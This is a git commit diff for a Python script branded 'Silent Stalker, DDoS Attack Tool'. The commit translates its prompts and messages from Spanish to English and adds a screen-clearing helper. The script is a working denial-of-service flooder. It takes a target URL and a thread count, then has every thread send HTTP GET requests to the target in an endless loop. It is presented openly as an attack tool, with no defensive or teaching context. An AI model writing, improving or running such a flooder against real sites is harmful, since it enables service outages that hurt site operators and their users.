8bbba3936f55d31cd3ae9aa4a358d348b78ec710
TheYoungHackerHa <prosariohakeronew@gmail.com>
2024-10-05 09:24:59 -0500

    Idioma actualizado a ingles

--- DDoS.py
+++ DDoS.py
@@ -1,28 +1,36 @@
+import os
 import requests
 import threading
 import time
 
 running = True
 
+def limpiar_pantalla():
+    if os.name == 'nt':
+        os.system('cls')
+    else:
+        os.system('clear')
+
 def logo():
+    limpiar_pantalla()
     print("  ____    ____  ")
     print(" / ___|  / ___| ")
     print("| |     | |     ")
     print(" \___ \  \___ \ ")
     print("  ___) |  ___) |")
     print(" |____/  |____/ \n")
-    print("Silent Stalker\nDDoS Attack Tool\nBy: TheYoungHackerHa\n")
+    print("Silent Stalker\nDDoS Attack Tool\nBy: TheYoungHackerHa\n\nTo Stop The Tool Type Ctrl + Alt + C\n")
 
 def enviar_solicitudes(url):
     while True:
         try:
             respuesta = requests.get(url)
-            print(f"Solicitud enviada, estado: {respuesta.status_code}")
+            print(f"Request send, state: {respuesta.status_code}")
         except Exception as e:
-            print(f"Error al enviar la solicitud: {e}")
+            print(f"Error sending request: {e}")
 
 def ataque_ddos(url, num_hilos):
-    print(f"Iniciando ataque DDoS a {url} con {num_hilos} hilos")
+    print(f"initiating DDoS attack on {url} with {num_hilos} threads")
     threads = []
     for _ in range(num_hilos):
         hilo = threading.Thread(target=enviar_solicitudes, args=(url,))
@@ -32,15 +40,15 @@ def ataque_ddos(url, num_hilos):
     for hilo in threads:
         hilo.join()
 
-    print("Ataque DDoS finalizado")
+    print("DDoS Attack FINISH")
 
 def main():
-    url = input(f"Ingrese la URL a atacar: ")
+    url = input(f"Enter the url: ")
     try:
-        num_hilos = int(input(f"Ingrese el número de hilos: "))
+        num_hilos = int(input(f"Enter the threads: "))
         ataque_ddos(url, num_hilos)
     except:
-        print("Ingrese un numero valido")
+        print("Enter a valid num")
         
 if __name__ == "__main__":
     logo()
